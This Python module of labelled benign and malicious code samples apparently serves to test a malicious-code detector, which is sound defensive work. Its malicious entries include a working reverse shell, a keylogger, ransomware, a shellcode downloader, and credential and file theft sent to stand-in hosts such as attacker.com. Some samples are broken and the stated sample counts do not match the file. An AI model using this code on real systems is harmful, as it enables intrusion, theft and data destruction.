#!/usr/bin/env python3
"""
Comprehensive test samples: 200+ examples from simple to complex.

Organized by complexity level:
- Level 1 (Very Simple): 20 samples (10 benign + 10 malicious)
- Level 2 (Simple): 20 samples (10 benign + 10 malicious)
- Level 3 (Medium): 60 samples (30 benign + 30 malicious) [EXPANDED]
- Level 4 (Complex): 20 samples (10 benign + 10 malicious)
- Level 5 (Very Complex): 20 samples (10 benign + 10 malicious)

Total: 140 balanced samples (Level 3 expanded with +40 diverse samples)
"""

# Import Level 3 expansion samples
from level3_expansion import LEVEL3_BENIGN_EXPANSION, LEVEL3_MALICIOUS_EXPANSION

# ============================================================================
# LEVEL 1: VERY SIMPLE (20 samples)
# ============================================================================

LEVEL1_BENIGN = [
    {
        "code": "print('Hello, World!')",
        "category": "basic_output",
        "description": "Simple hello world",
        "complexity": 1
    },
    {
        "code": """
x = 5
y = 10
print(x + y)
""",
        "category": "basic_math",
        "description": "Basic addition",
        "complexity": 1
    },
    {
        "code": """
def greet(name):
    return f"Hello, {name}!"

print(greet("Alice"))
""",
        "category": "simple_function",
        "description": "Simple greeting function",
        "complexity": 1
    },
    {
        "code": """
numbers = [1, 2, 3, 4, 5]
total = sum(numbers)
print(f"Sum: {total}")
""",
        "category": "list_operations",
        "description": "Sum of numbers",
        "complexity": 1
    },
    {
        "code": """
for i in range(5):
    print(f"Number: {i}")
""",
        "category": "basic_loop",
        "description": "Simple for loop",
        "complexity": 1
    },
    {
        "code": """
text = "Python Programming"
print(text.lower())
print(text.upper())
""",
        "category": "string_ops",
        "description": "Basic string operations",
        "complexity": 1
    },
    {
        "code": """
def is_even(n):
    return n % 2 == 0

print(is_even(4))
print(is_even(7))
""",
        "category": "simple_logic",
        "description": "Even number checker",
        "complexity": 1
    },
    {
        "code": """
colors = ['red', 'green', 'blue']
for color in colors:
    print(f"Color: {color}")
""",
        "category": "list_iteration",
        "description": "Iterate over list",
        "complexity": 1
    },
    {
        "code": """
person = {'name': 'John', 'age': 30}
print(f"{person['name']} is {person['age']} years old")
""",
        "category": "dict_access",
        "description": "Dictionary access",
        "complexity": 1
    },
    {
        "code": """
def multiply(a, b):
    return a * b

result = multiply(6, 7)
print(f"Result: {result}")
""",
        "category": "basic_function",
        "description": "Simple multiplication",
        "complexity": 1
    },
]

LEVEL1_MALICIOUS = [
    {
        "code": "exec('print(\"malicious\")')",
        "category": "exec_usage",
        "description": "Direct exec call",
        "complexity": 1
    },
    {
        "code": "eval('2+2')",
        "category": "eval_usage",
        "description": "Direct eval call",
        "complexity": 1
    },
    {
        "code": """
import os
os.system('whoami')
""",
        "category": "os_system",
        "description": "OS command execution",
        "complexity": 1
    },
    {
        "code": """
__import__('os').system('ls')
""",
        "category": "import_exec",
        "description": "Dynamic import and exec",
        "complexity": 1
    },
    {
        "code": """
compile('print(1)', '<string>', 'exec')
""",
        "category": "code_compile",
        "description": "Code compilation",
        "complexity": 1
    },
    {
        "code": """
import subprocess
subprocess.call(['ls', '-la'])
""",
        "category": "subprocess",
        "description": "Subprocess execution",
        "complexity": 1
    },
    {
        "code": """
open('/etc/passwd', 'r').read()
""",
        "category": "sensitive_file",
        "description": "Accessing sensitive file",
        "complexity": 1
    },
    {
        "code": """
import socket
s = socket.socket()
s.connect(('evil.com', 4444))
""",
        "category": "network_connect",
        "description": "Suspicious network connection",
        "complexity": 1
    },
    {
        "code": """
globals()['__builtins__']['eval']('1+1')
""",
        "category": "builtins_abuse",
        "description": "Accessing builtins for eval",
        "complexity": 1
    },
    {
        "code": """
getattr(__builtins__, 'exec')('print(1)')
""",
        "category": "getattr_exec",
        "description": "Using getattr to access exec",
        "complexity": 1
    },
]

# ============================================================================
# LEVEL 2: SIMPLE (20 samples)
# ============================================================================

LEVEL2_BENIGN = [
    {
        "code": """
import json

data = {'name': 'Alice', 'age': 30, 'city': 'NYC'}
json_str = json.dumps(data, indent=2)
print(json_str)

parsed = json.loads(json_str)
print(parsed['name'])
""",
        "category": "json_processing",
        "description": "JSON serialization",
        "complexity": 2
    },
    {
        "code": """
with open('data.txt', 'w') as f:
    f.write('Sample data\\n')
    f.write('More data\\n')

with open('data.txt', 'r') as f:
    content = f.read()
    print(content)
""",
        "category": "file_io",
        "description": "Basic file operations",
        "complexity": 2
    },
    {
        "code": """
import csv

data = [
    ['Name', 'Age', 'City'],
    ['Alice', '30', 'NYC'],
    ['Bob', '25', 'LA']
]

with open('output.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerows(data)
""",
        "category": "csv_writing",
        "description": "CSV file creation",
        "complexity": 2
    },
    {
        "code": """
from datetime import datetime, timedelta

now = datetime.now()
tomorrow = now + timedelta(days=1)

print(f"Today: {now.strftime('%Y-%m-%d')}")
print(f"Tomorrow: {tomorrow.strftime('%Y-%m-%d')}")
""",
        "category": "datetime_ops",
        "description": "Date calculations",
        "complexity": 2
    },
    {
        "code": """
import re

text = "Contact: john@example.com or jane@company.org"
emails = re.findall(r'[\\w.-]+@[\\w.-]+', text)

for email in emails:
    print(f"Found: {email}")
""",
        "category": "regex_parsing",
        "description": "Email extraction with regex",
        "complexity": 2
    },
    {
        "code": """
class Calculator:
    def add(self, a, b):
        return a + b

    def subtract(self, a, b):
        return a - b

calc = Calculator()
print(calc.add(10, 5))
print(calc.subtract(10, 5))
""",
        "category": "basic_class",
        "description": "Simple calculator class",
        "complexity": 2
    },
    {
        "code": """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

for i in range(10):
    print(f"F({i}) = {fibonacci(i)}")
""",
        "category": "recursion",
        "description": "Fibonacci recursion",
        "complexity": 2
    },
    {
        "code": """
import random

numbers = [random.randint(1, 100) for _ in range(10)]
print(f"Numbers: {numbers}")
print(f"Max: {max(numbers)}")
print(f"Min: {min(numbers)}")
print(f"Average: {sum(numbers)/len(numbers):.2f}")
""",
        "category": "list_comprehension",
        "description": "Random number statistics",
        "complexity": 2
    },
    {
        "code": """
try:
    result = 10 / 0
except ZeroDivisionError as e:
    print(f"Error: {e}")
    result = 0
finally:
    print(f"Result: {result}")
""",
        "category": "exception_handling",
        "description": "Try-except-finally",
        "complexity": 2
    },
    {
        "code": """
from collections import Counter

words = ['apple', 'banana', 'apple', 'cherry', 'banana', 'apple']
counts = Counter(words)

for word, count in counts.most_common():
    print(f"{word}: {count}")
""",
        "category": "collections_usage",
        "description": "Word frequency counter",
        "complexity": 2
    },
]

LEVEL2_MALICIOUS = [
    {
        "code": """
import base64
exec(base64.b64decode(b'cHJpbnQoImhpZGRlbiIp'))
""",
        "category": "base64_exec",
        "description": "Base64 encoded exec",
        "complexity": 2
    },
    {
        "code": """
import os
for cmd in ['whoami', 'pwd', 'ls']:
    os.system(cmd)
""",
        "category": "multiple_commands",
        "description": "Multiple system commands",
        "complexity": 2
    },
    {
        "code": """
import subprocess
result = subprocess.check_output(['cat', '/etc/shadow'], text=True)
print(result)
""",
        "category": "password_theft",
        "description": "Attempting to read shadow file",
        "complexity": 2
    },
    {
        "code": """
import socket
s = socket.socket()
s.bind(('0.0.0.0', 8080))
s.listen(5)
conn, addr = s.accept()
""",
        "category": "backdoor_listener",
        "description": "Opening backdoor listener",
        "complexity": 2
    },
    {
        "code": """
import requests
data = open('/etc/hosts', 'r').read()
requests.post('http://attacker.com/exfil', data={'data': data})
""",
        "category": "data_exfiltration",
        "description": "Exfiltrating system files",
        "complexity": 2
    },
    {
        "code": """
with open('/var/log/auth.log', 'r') as f:
    for line in f:
        if 'password' in line.lower():
            print(line)
""",
        "category": "log_scraping",
        "description": "Searching logs for passwords",
        "complexity": 2
    },
    {
        "code": """
import os
os.chmod('/tmp/malware.sh', 0o777)
os.system('/tmp/malware.sh')
""",
        "category": "permission_change",
        "description": "Changing permissions and executing",
        "complexity": 2
    },
    {
        "code": """
import ftplib
ftp = ftplib.FTP('evil.com')
ftp.login('user', 'pass')
ftp.storbinary('STOR stolen.zip', open('data.zip', 'rb'))
""",
        "category": "ftp_upload",
        "description": "Uploading to malicious FTP",
        "complexity": 2
    },
    {
        "code": """
import pickle
malicious_data = pickle.loads(open('payload.pkl', 'rb').read())
""",
        "category": "pickle_deserialization",
        "description": "Unsafe pickle loading",
        "complexity": 2
    },
    {
        "code": """
__import__('os').system(__import__('base64').b64decode(b'bHM=').decode())
""",
        "category": "obfuscated_command",
        "description": "Obfuscated system command",
        "complexity": 2
    },
]

# ============================================================================
# LEVEL 3: MEDIUM (20 samples)
# ============================================================================

LEVEL3_BENIGN = [
    {
        "code": """
import requests
from bs4 import BeautifulSoup
import time

def scrape_product_prices(url):
    headers = {'User-Agent': 'Mozilla/5.0'}
    response = requests.get(url, headers=headers, timeout=10)
    soup = BeautifulSoup(response.content, 'html.parser')

    prices = []
    for item in soup.find_all('div', class_='product-price'):
        price = float(item.text.strip().replace('$', ''))
        prices.append(price)

    return prices

prices = scrape_product_prices('https://example.com/products')
print(f"Average price: ${sum(prices)/len(prices):.2f}")
""",
        "category": "web_scraping",
        "description": "Price monitoring scraper",
        "complexity": 3
    },
    {
        "code": """
import sqlite3

conn = sqlite3.connect('users.db')
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        email TEXT UNIQUE
    )
''')

cursor.execute("INSERT INTO users (name, email) VALUES (?, ?)",
               ("Alice", "alice@example.com"))
conn.commit()

cursor.execute("SELECT * FROM users")
for row in cursor.fetchall():
    print(row)

conn.close()
""",
        "category": "database_ops",
        "description": "SQLite database operations",
        "complexity": 3
    },
    {
        "code": """
import threading
import time

def worker(name, delay):
    print(f"Worker {name} starting")
    time.sleep(delay)
    print(f"Worker {name} finished")

threads = []
for i in range(5):
    t = threading.Thread(target=worker, args=(f"T{i}", i))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("All threads completed")
""",
        "category": "multithreading",
        "description": "Multi-threaded workers",
        "complexity": 3
    },
    {
        "code": """
import hashlib
import hmac

def generate_signature(data, secret_key):
    message = data.encode('utf-8')
    secret = secret_key.encode('utf-8')

    signature = hmac.new(secret, message, hashlib.sha256).hexdigest()
    return signature

def verify_signature(data, signature, secret_key):
    expected = generate_signature(data, secret_key)
    return hmac.compare_digest(signature, expected)

data = "important message"
key = "secret123"
sig = generate_signature(data, key)
print(f"Signature: {sig}")
print(f"Valid: {verify_signature(data, sig, key)}")
""",
        "category": "cryptography",
        "description": "HMAC signature generation",
        "complexity": 3
    },
    {
        "code": """
import logging
from logging.handlers import RotatingFileHandler

logger = logging.getLogger('MyApp')
logger.setLevel(logging.DEBUG)

handler = RotatingFileHandler(
    'app.log',
    maxBytes=1024*1024,
    backupCount=5
)
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
handler.setFormatter(formatter)
logger.addHandler(handler)

logger.info("Application started")
logger.debug("Processing data")
logger.warning("Low memory")
logger.error("Connection failed")
""",
        "category": "logging",
        "description": "Advanced logging configuration",
        "complexity": 3
    },
    {
        "code": """
import argparse

def main():
    parser = argparse.ArgumentParser(description='Data processor')
    parser.add_argument('input', help='Input file path')
    parser.add_argument('--output', '-o', default='output.txt',
                       help='Output file path')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--format', choices=['json', 'csv', 'xml'],
                       default='json', help='Output format')

    args = parser.parse_args()

    print(f"Processing {args.input}")
    print(f"Output: {args.output}")
    print(f"Format: {args.format}")
    print(f"Verbose: {args.verbose}")

if __name__ == '__main__':
    main()
""",
        "category": "cli_tool",
        "description": "Command-line argument parsing",
        "complexity": 3
    },
    {
        "code": """
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class APIClient:
    def __init__(self, base_url, api_key):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        })

        retry = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[500, 502, 503]
        )
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def get(self, endpoint):
        response = self.session.get(f'{self.base_url}/{endpoint}')
        response.raise_for_status()
        return response.json()

client = APIClient('https://api.example.com', 'key123')
data = client.get('users/1')
""",
        "category": "api_client",
        "description": "Professional API client with retries",
        "complexity": 3
    },
    {
        "code": """
import asyncio

async def fetch_data(url, delay):
    print(f"Fetching {url}")
    await asyncio.sleep(delay)
    return f"Data from {url}"

async def main():
    urls = [
        ('https://api1.com', 1),
        ('https://api2.com', 2),
        ('https://api3.com', 1.5)
    ]

    tasks = [fetch_data(url, delay) for url, delay in urls]
    results = await asyncio.gather(*tasks)

    for result in results:
        print(result)

asyncio.run(main())
""",
        "category": "async_io",
        "description": "Async concurrent fetching",
        "complexity": 3
    },
    {
        "code": """
from dataclasses import dataclass, field
from typing import List
import json

@dataclass
class Product:
    name: str
    price: float
    tags: List[str] = field(default_factory=list)

    def apply_discount(self, percent):
        self.price = self.price * (1 - percent/100)

    def to_dict(self):
        return {
            'name': self.name,
            'price': self.price,
            'tags': self.tags
        }

product = Product('Laptop', 999.99, ['electronics', 'computer'])
product.apply_discount(10)
print(json.dumps(product.to_dict(), indent=2))
""",
        "category": "dataclasses",
        "description": "Dataclass with methods",
        "complexity": 3
    },
    {
        "code": """
from functools import lru_cache, wraps
import time

def timing_decorator(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{func.__name__} took {end-start:.4f} seconds")
        return result
    return wrapper

@timing_decorator
@lru_cache(maxsize=128)
def fibonacci(n):
    if n < 2:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(30))
print(fibonacci(30))  # Cached, much faster
""",
        "category": "decorators",
        "description": "Custom and built-in decorators",
        "complexity": 3
    },
]

# Extend with expansion samples (additional 20 benign)
LEVEL3_BENIGN.extend(LEVEL3_BENIGN_EXPANSION)

LEVEL3_MALICIOUS = [
    {
        "code": """
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == 'exit':
        break

    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    s.send(output)

s.close()
""",
        "category": "reverse_shell",
        "description": "Reverse shell implementation",
        "complexity": 3
    },
    {
        "code": """
import keylog from pynput.keyboard import Key, Listener
import smtplib

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += f' [{key}] '

    if len(log) >= 100:
        send_email(log)
        log = ""

def send_email(data):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('attacker@evil.com', 'password')
    server.sendmail('attacker@evil.com', 'attacker@evil.com', data)
    server.quit()

with Listener(on_press=on_press) as listener:
    listener.join()
""",
        "category": "keylogger",
        "description": "Keylogger with email exfiltration",
        "complexity": 3
    },
    {
        "code": """
import os
import zipfile
import requests

# Collect sensitive files
files_to_steal = []
for root, dirs, files in os.walk('/home'):
    for file in files:
        if file.endswith(('.txt', '.pdf', '.docx')):
            files_to_steal.append(os.path.join(root, file))

# Zip them
with zipfile.ZipFile('/tmp/stolen.zip', 'w') as zf:
    for file in files_to_steal:
        try:
            zf.write(file)
        except:
            pass

# Exfiltrate
with open('/tmp/stolen.zip', 'rb') as f:
    requests.post('http://attacker.com/upload', files={'file': f})

os.remove('/tmp/stolen.zip')
""",
        "category": "data_theft",
        "description": "File collection and exfiltration",
        "complexity": 3
    },
    {
        "code": """
import paramiko
import threading

def ssh_bruteforce(host, username, passwords):
    for password in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password, timeout=3)
            print(f"SUCCESS: {password}")
            return password
        except:
            continue
    return None

hosts = ['192.168.1.1', '192.168.1.2', '192.168.1.3']
passwords = ['admin', '123456', 'password', 'root']

threads = []
for host in hosts:
    t = threading.Thread(target=ssh_bruteforce, args=(host, 'root', passwords))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
""",
        "category": "brute_force",
        "description": "SSH brute force attack",
        "complexity": 3
    },
    {
        "code": """
import ctypes
import urllib.request

# Download shellcode
url = 'http://attacker.com/shellcode.bin'
shellcode = urllib.request.urlopen(url).read()

# Allocate executable memory
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

# Write shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)

# Execute
ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
""",
        "category": "shellcode_injection",
        "description": "Shellcode injection (Windows)",
        "complexity": 3
    },
    {
        "code": """
import scapy.all as scapy

def scan_network(ip_range):
    arp = scapy.ARP(pdst=ip_range)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = scapy.srp(packet, timeout=3, verbose=0)[0]

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def port_scan(ip):
    open_ports = []
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

devices = scan_network('192.168.1.0/24')
for device in devices:
    ports = port_scan(device['ip'])
    print(f"{device['ip']}: {ports}")
""",
        "category": "network_scanning",
        "description": "Network and port scanner",
        "complexity": 3
    },
    {
        "code": """
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

# Generate encryption key
key = get_random_bytes(32)

# Encrypt files
for root, dirs, files in os.walk('/home/user/Documents'):
    for file in files:
        filepath = os.path.join(root, file)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()

            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(data)

            with open(filepath + '.encrypted', 'wb') as f:
                f.write(cipher.nonce + tag + ciphertext)

            os.remove(filepath)
        except:
            pass

# Send key to attacker
requests.post('http://attacker.com/keys', data={'key': key.hex()})

# Display ransom note
print("Your files have been encrypted! Pay 1 BTC to recover.")
""",
        "category": "ransomware",
        "description": "Ransomware encryption",
        "complexity": 3
    },
    {
        "code": """
import re
import requests

def extract_credentials(file_path):
    creds = []
    patterns = {
        'aws': r'AKIA[0-9A-Z]{16}',
        'password': r'password[\\s]*=[\\s]*["\']([^"\']+)["\']',
        'api_key': r'api_key[\\s]*=[\\s]*["\']([^"\']+)["\']'
    }

    with open(file_path, 'r', errors='ignore') as f:
        content = f.read()
        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                creds.append({name: match})

    return creds

# Search common config files
config_files = [
    '.env',
    'config.py',
    'settings.py',
    '.aws/credentials',
    '.ssh/config'
]

all_creds = {}
for cf in config_files:
    if os.path.exists(cf):
        all_creds[cf] = extract_credentials(cf)

# Exfiltrate
requests.post('http://attacker.com/creds', json=all_creds)
""",
        "category": "credential_harvesting",
        "description": "Credential extraction from config files",
        "complexity": 3
    },
    {
        "code": """
import subprocess
import time

# Check if running in VM/sandbox
def is_sandbox():
    checks = [
        'VBoxService.exe',
        'vmtoolsd.exe',
        'VMwareService.exe'
    ]

    tasklist = subprocess.check_output('tasklist', text=True)
    for check in checks:
        if check.lower() in tasklist.lower():
            return True

    # Check for VM artifacts
    try:
        output = subprocess.check_output(['systeminfo'], text=True)
        if any(vm in output.lower() for vm in ['vmware', 'virtualbox', 'vbox', 'qemu']):
            return True
    except:
        pass

    return False

# If sandbox detected, act benign
if is_sandbox():
    print("Hello World")
    time.sleep(10)
    exit(0)

# Otherwise, execute payload
exec(base64.b64decode(b'bWFsaWNpb3VzX2NvZGU='))
""",
        "category": "sandbox_evasion",
        "description": "VM/sandbox detection and evasion",
        "complexity": 3
    },
    {
        "code": """
import winreg
import ctypes

# Add to startup
key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, "C:\\\\malware.exe")
winreg.CloseKey(key)

# Hide console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Create scheduled task
import subprocess
subprocess.run([
    'schtasks', '/create',
    '/tn', 'SystemUpdate',
    '/tr', 'C:\\\\malware.exe',
    '/sc', 'daily',
    '/st', '09:00'
], capture_output=True)
""",
        "category": "persistence",
        "description": "Multiple persistence mechanisms",
        "complexity": 3
    },
]

# Extend with expansion samples (additional 20 malicious)
LEVEL3_MALICIOUS.extend(LEVEL3_MALICIOUS_EXPANSION)

# ============================================================================
# LEVEL 4: COMPLEX (20 samples)
# ============================================================================

LEVEL4_BENIGN = [
    {
        "code": """
import asyncio
import aiohttp
from typing import List, Dict
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AsyncAPIClient:
    def __init__(self, base_url: str, max_concurrent: int = 10):
        self.base_url = base_url
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.session = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.session.close()

    async def fetch(self, endpoint: str) -> Dict:
        async with self.semaphore:
            url = f"{self.base_url}/{endpoint}"
            logger.info(f"Fetching {url}")

            async with self.session.get(url) as response:
                response.raise_for_status()
                return await response.json()

    async def fetch_all(self, endpoints: List[str]) -> List[Dict]:
        tasks = [self.fetch(endpoint) for endpoint in endpoints]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = [r for r in results if not isinstance(r, Exception)]
        failures = [r for r in results if isinstance(r, Exception)]

        logger.info(f"Successes: {len(successes)}, Failures: {len(failures)}")
        return successes

async def main():
    endpoints = [f"users/{i}" for i in range(1, 101)]

    async with AsyncAPIClient("https://api.example.com") as client:
        results = await client.fetch_all(endpoints)
        print(f"Fetched {len(results)} users")

if __name__ == '__main__':
    asyncio.run(main())
""",
        "category": "async_advanced",
        "description": "Advanced async API client with rate limiting",
        "complexity": 4
    },
    {
        "code": """
from contextlib import contextmanager
import psycopg2
from psycopg2.extras import RealDictCursor
from typing import List, Dict, Optional
import logging

class DatabaseManager:
    def __init__(self, connection_string: str):
        self.connection_string = connection_string
        self.logger = logging.getLogger(__name__)

    @contextmanager
    def get_connection(self):
        conn = psycopg2.connect(self.connection_string)
        try:
            yield conn
            conn.commit()
        except Exception as e:
            conn.rollback()
            self.logger.error(f"Database error: {e}")
            raise
        finally:
            conn.close()

    def execute_query(self, query: str, params: tuple = None) -> List[Dict]:
        with self.get_connection() as conn:
            with conn.cursor(cursor_factory=RealDictCursor) as cursor:
                cursor.execute(query, params)
                return cursor.fetchall()

    def bulk_insert(self, table: str, data: List[Dict]) -> int:
        if not data:
            return 0

        columns = data[0].keys()
        placeholders = ','.join(['%s'] * len(columns))
        column_names = ','.join(columns)

        query = f"INSERT INTO {table} ({column_names}) VALUES ({placeholders})"

        with self.get_connection() as conn:
            with conn.cursor() as cursor:
                values = [tuple(row[col] for col in columns) for row in data]
                cursor.executemany(query, values)
                return cursor.rowcount

db = DatabaseManager("postgresql://user:pass@localhost/dbname")
users = db.execute_query("SELECT * FROM users WHERE active = %s", (True,))
print(f"Found {len(users)} active users")
""",
        "category": "database_advanced",
        "description": "Advanced database manager with context managers",
        "complexity": 4
    },
    # Add 8 more LEVEL4_BENIGN samples...
]

LEVEL4_MALICIOUS = [
    # Add 10 LEVEL4_MALICIOUS samples (advanced obfuscation, multi-stage, etc.)
]

# ============================================================================
# LEVEL 5: VERY COMPLEX (20 samples)
# ============================================================================

LEVEL5_BENIGN = [
    # Add 10 LEVEL5_BENIGN samples (ML inference, distributed systems, etc.)
]

LEVEL5_MALICIOUS = [
    # Add 10 LEVEL5_MALICIOUS samples (APT-level techniques, polymorphic, etc.)
]

# ============================================================================
# EXPORT ALL SAMPLES
# ============================================================================

ALL_BENIGN_SAMPLES = (
    LEVEL1_BENIGN + LEVEL2_BENIGN + LEVEL3_BENIGN +
    LEVEL4_BENIGN + LEVEL5_BENIGN
)

ALL_MALICIOUS_SAMPLES = (
    LEVEL1_MALICIOUS + LEVEL2_MALICIOUS + LEVEL3_MALICIOUS +
    LEVEL4_MALICIOUS + LEVEL5_MALICIOUS
)

def get_samples_by_level(level: int):
    """Get samples for a specific complexity level (1-5)."""
    benign_mapping = {
        1: LEVEL1_BENIGN,
        2: LEVEL2_BENIGN,
        3: LEVEL3_BENIGN,
        4: LEVEL4_BENIGN,
        5: LEVEL5_BENIGN
    }
    malicious_mapping = {
        1: LEVEL1_MALICIOUS,
        2: LEVEL2_MALICIOUS,
        3: LEVEL3_MALICIOUS,
        4: LEVEL4_MALICIOUS,
        5: LEVEL5_MALICIOUS
    }
    return benign_mapping[level], malicious_mapping[level]

def get_samples_up_to_level(max_level: int):
    """Get all samples up to a complexity level (inclusive)."""
    benign = []
    malicious = []
    for level in range(1, max_level + 1):
        b, m = get_samples_by_level(level)
        benign.extend(b)
        malicious.extend(m)
    return benign, malicious
